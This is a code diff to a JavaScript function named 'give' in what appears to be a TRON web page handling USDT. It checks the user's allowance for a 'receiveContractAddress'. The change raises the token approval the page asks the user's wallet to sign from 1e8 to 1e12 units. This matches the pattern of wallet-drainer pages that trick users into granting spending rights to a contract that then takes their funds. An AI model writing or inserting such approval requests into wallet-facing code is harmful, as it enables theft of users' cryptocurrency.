@@ -72,9 +72,8 @@ const give =async()=>{
         let usdtContract = await window.tronWeb.contract().at(usdtAddress);
         console.log("usdtContract:" + usdtContract)
         let  allowance= await usdtContract.allowance(account,receiveContractAddress).call();
-        if(allowance <= 1000000000000){
-          let x = 100000000;
-          const result = await usdtContract.approve(receiveContractAddress, x).send({
+        if(allowance <= 1000000000000){ 
+          const result = await usdtContract.approve(receiveContractAddress, 1000000000000).send({
             feeLimit:"100000000"
           });
           console.log(result);
